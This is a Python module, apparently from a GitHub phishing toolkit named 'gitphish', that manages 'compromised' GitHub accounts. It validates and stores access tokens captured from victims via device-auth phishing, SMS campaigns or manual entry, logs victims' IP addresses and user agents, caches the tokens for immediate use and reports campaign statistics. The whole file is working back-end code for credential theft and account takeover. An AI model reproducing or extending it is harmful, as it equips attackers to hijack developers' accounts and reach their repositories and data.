"""
Compromised GitHub Account Management Service

This service provides high-level operations for managing compromised GitHub accounts
obtained from victims through device auth flows or manual entry.
"""

import logging
from typing import Dict, Any, List, Optional, Type
from datetime import datetime

from gitphish.models.github.compromised_account import CompromisedGitHubAccount
from gitphish.models.database import db_session_scope
from gitphish.core.accounts.services.base_service import (
    BaseGitHubAccountService,
)

logger = logging.getLogger(__name__)


class CompromisedGitHubAccountService(BaseGitHubAccountService):
    """Service for managing compromised GitHub accounts."""

    @property
    def account_model(self) -> Type[CompromisedGitHubAccount]:
        """Return the CompromisedGitHubAccount model class."""
        return CompromisedGitHubAccount

    @property
    def account_type_name(self) -> str:
        """Return a human-readable name for this account type."""
        return "compromised"

    def add_compromised_account(
        self,
        token: str,
        source: str = "manual",
        device_auth_session_id: str = None,
        victim_info: Dict[str, Any] = None,
        override_email: str = None,
    ) -> Dict[str, Any]:
        """
        Add a new compromised GitHub account.

        Args:
            token: GitHub Personal Access Token
            source: Source of the token ('manual', 'sms', or 'dynamic')
            device_auth_session_id: Device auth session ID if applicable
            victim_info: Additional victim information (IP, user agent, etc.)
            override_email: Email to use instead of GitHub API email (for SMS/dynamic captures)

        Returns:
            Dictionary with operation result
        """
        try:
            logger.debug(
                f"Adding {self.account_type_name} GitHub account from source: {source}"
            )

            # Validate the token using base class method
            token_info = self._validate_token(token)

            if not token_info.is_valid:
                return {
                    "success": False,
                    "error": f"Invalid token: {token_info.error_message}",
                }

            # Create token hash for checking duplicates
            token_hash = self._create_token_hash(token)

            with db_session_scope() as session:
                # Check if this token already exists
                existing_by_token = self._check_duplicate_by_token_hash(
                    session, token_hash
                )
                if existing_by_token:
                    logger.debug(
                        f"{self.account_type_name} account already exists: {token_info.username}"
                    )
                    return {
                        "success": False,
                        "error": f"This token is already registered for user {existing_by_token.username}",
                    }

                # Check if username already exists (different token)
                existing_by_username = self._check_duplicate_by_username(
                    session, token_info.username
                )
                if existing_by_username:
                    logger.debug(
                        f"User {token_info.username} already {self.account_type_name} with different token"
                    )
                    # This is actually interesting - same user, different token
                    # We'll allow it but log it as noteworthy

                # Create new compromised account
                account = CompromisedGitHubAccount.create_from_token_info(
                    token_info,
                    token,
                    source=source,
                    device_auth_session_id=device_auth_session_id,
                    victim_info=victim_info,
                    override_email=override_email,
                )

                session.add(account)
                session.commit()

                # Cache the token for immediate use
                self._cache_token(account.id, token)

                logger.debug(
                    f"Added {self.account_type_name} GitHub account: {token_info.username} (source: {source})"
                )

                return {
                    "success": True,
                    "account": account.to_dict(),
                    "message": f"Successfully added {self.account_type_name} account for {token_info.username}",
                }

        except Exception as e:
            logger.error(
                f"Failed to add {self.account_type_name} GitHub account: {str(e)}"
            )
            return {
                "success": False,
                "error": f"Failed to add {self.account_type_name} account: {str(e)}",
            }

    def get_all_compromised_accounts(self) -> List[Dict[str, Any]]:
        """
        Get all active compromised GitHub accounts.

        Returns:
            List of compromised account dictionaries
        """
        return self.get_all_accounts()

    def get_compromised_accounts_by_source(self, source: str) -> List[Dict[str, Any]]:
        """
        Get compromised accounts by source.

        Args:
            source: Source type ('manual', 'sms', or 'dynamic')

        Returns:
            List of compromised account dictionaries
        """
        try:
            with db_session_scope() as session:
                accounts = CompromisedGitHubAccount.get_by_source(session, source)
                return [account.to_dict() for account in accounts]
        except Exception as e:
            logger.error(
                f"Failed to get compromised accounts by source {source}: {str(e)}"
            )
            return []

    def get_compromised_account_repositories(self, account_id: int) -> Dict[str, Any]:
        """
        Get repositories for a specific compromised GitHub account.

        Args:
            account_id: ID of the compromised GitHub account

        Returns:
            Dictionary with repositories or error
        """
        return self.get_account_repositories(account_id)

    def validate_compromised_account(self, account_id: int) -> Dict[str, Any]:
        """
        Re-validate a compromised GitHub account's token.

        Args:
            account_id: ID of the compromised GitHub account

        Returns:
            Dictionary with validation result
        """
        return self.validate_account(account_id)

    def mark_account_analyzed(self, account_id: int) -> Dict[str, Any]:
        """
        Mark a compromised account as analyzed.

        Args:
            account_id: ID of the compromised GitHub account

        Returns:
            Dictionary with operation result
        """
        try:
            with db_session_scope() as session:
                account = session.get(CompromisedGitHubAccount, account_id)
                if not account or not account.is_active:
                    return {
                        "success": False,
                        "error": "Compromised account not found",
                    }

                account.mark_as_analyzed()
                session.commit()

                logger.debug(
                    f"Marked compromised account {account.username} as analyzed"
                )

                return {
                    "success": True,
                    "account": account.to_dict(),
                    "message": f"Marked {account.username} as analyzed",
                }

        except Exception as e:
            logger.error(
                f"Failed to mark compromised account {account_id} as analyzed: {str(e)}"
            )
            return {"success": False, "error": str(e)}

    def mark_account_unanalyzed(self, account_id: int) -> Dict[str, Any]:
        """
        Unmark a compromised account as analyzed.

        Args:
            account_id: ID of the compromised GitHub account

        Returns:
            Dictionary with operation result
        """
        try:
            with db_session_scope() as session:
                account = session.get(CompromisedGitHubAccount, account_id)
                if not account or not account.is_active:
                    return {
                        "success": False,
                        "error": "Compromised account not found",
                    }

                account.mark_as_unanalyzed()
                session.commit()

                logger.debug(
                    f"Unmarked compromised account {account.username} as analyzed"
                )

                return {
                    "success": True,
                    "account": account.to_dict(),
                    "message": f"Unmarked {account.username} as analyzed",
                }

        except Exception as e:
            logger.error(
                f"Failed to unmark compromised account {account_id} as analyzed: {str(e)}"
            )
            return {"success": False, "error": str(e)}

    def remove_compromised_account(self, account_id: int) -> Dict[str, Any]:
        """
        Remove (soft delete) a compromised GitHub account.

        Args:
            account_id: ID of the compromised GitHub account

        Returns:
            Dictionary with operation result
        """
        return self.remove_account(account_id)

    def get_compromised_account_token(self, account_id: int) -> Optional[str]:
        """
        Get the token for a specific compromised account.

        Args:
            account_id: ID of the compromised GitHub account

        Returns:
            Token string or None if not found
        """
        return self.get_account_token(account_id)

    def get_statistics(self) -> Dict[str, Any]:
        """
        Get statistics about compromised accounts.

        Returns:
            Dictionary with statistics
        """
        try:
            with db_session_scope() as session:
                total_accounts = (
                    session.query(CompromisedGitHubAccount)
                    .filter(CompromisedGitHubAccount.is_active)
                    .count()
                )

                valid_accounts = (
                    session.query(CompromisedGitHubAccount)
                    .filter(
                        CompromisedGitHubAccount.is_active,
                        CompromisedGitHubAccount.is_valid,
                    )
                    .count()
                )

                manual_accounts = (
                    session.query(CompromisedGitHubAccount)
                    .filter(
                        CompromisedGitHubAccount.is_active,
                        CompromisedGitHubAccount.source == "manual",
                    )
                    .count()
                )

                sms_accounts = (
                    session.query(CompromisedGitHubAccount)
                    .filter(
                        CompromisedGitHubAccount.is_active,
                        CompromisedGitHubAccount.source == "sms",
                    )
                    .count()
                )

                dynamic_accounts = (
                    session.query(CompromisedGitHubAccount)
                    .filter(
                        CompromisedGitHubAccount.is_active,
                        CompromisedGitHubAccount.source == "dynamic",
                    )
                    .count()
                )

                analyzed_accounts = (
                    session.query(CompromisedGitHubAccount)
                    .filter(
                        CompromisedGitHubAccount.is_active,
                        CompromisedGitHubAccount.is_analyzed,
                    )
                    .count()
                )

                return {
                    "total_accounts": total_accounts,
                    "valid_accounts": valid_accounts,
                    "invalid_accounts": total_accounts - valid_accounts,
                    "manual_accounts": manual_accounts,
                    "sms_accounts": sms_accounts,
                    "dynamic_accounts": dynamic_accounts,
                    "analyzed_accounts": analyzed_accounts,
                    "unanalyzed_accounts": total_accounts - analyzed_accounts,
                }

        except Exception as e:
            logger.error(f"Failed to get compromised account statistics: {str(e)}")
            return {
                "total_accounts": 0,
                "valid_accounts": 0,
                "invalid_accounts": 0,
                "manual_accounts": 0,
                "sms_accounts": 0,
                "dynamic_accounts": 0,
                "analyzed_accounts": 0,
                "unanalyzed_accounts": 0,
            }

    def record_compromised_account(
        self, email: str, access_token: str, visitor_data: dict, source: str = "dynamic"
    ) -> Dict[str, Any]:
        """
        Record a compromised account from auth server or SMS campaign data.

        This method is called by the auth server or SMS campaigns when a successful authentication occurs.

        Args:
            email: Email address of the compromised account
            access_token: GitHub access token obtained from OAuth flow
            visitor_data: Visitor information from the auth server
            source: Source of the capture ('dynamic', 'sms', etc.)

        Returns:
            Dictionary with operation result
        """
        try:
            logger.debug(f"Recording compromised account from {source}: {email}")

            # Extract victim information from visitor data
            victim_info = {
                "ip": visitor_data.get("ip_address"),
                "user_agent": visitor_data.get("headers", {}).get("User-Agent"),
                "location": None,  # Could add geolocation in the future
            }

            # Generate a unique session ID for this capture
            # Include campaign_id from visitor_data if present (for SMS campaigns)
            campaign_id = visitor_data.get('campaign_id')
            if campaign_id:
                device_auth_session_id = f"{source}_{campaign_id}_{email}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            else:
                device_auth_session_id = f"{source}_{email}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

            # Use the existing add_compromised_account method
            result = self.add_compromised_account(
                token=access_token,
                source=source,
                device_auth_session_id=device_auth_session_id,
                victim_info=victim_info,
                override_email=email,
            )

            if result["success"]:
                logger.debug(f"Successfully recorded compromised account: {email}")
                print(
                    f"💾 ACCOUNT RECORDED IN DATABASE! User: {result.get('account', {}).get('username', 'Unknown')}"
                )
            else:
                logger.warning(
                    f"Failed to record compromised account {email}: {result.get('error')}"
                )
                print(f"⚠️  Failed to record account in database: {result.get('error')}")

            return result

        except Exception as e:
            logger.error(f"Failed to record compromised account {email}: {str(e)}")
            print(f"❌ Error recording account in database: {str(e)}")
            return {
                "success": False,
                "error": f"Failed to record compromised account: {str(e)}",
            }
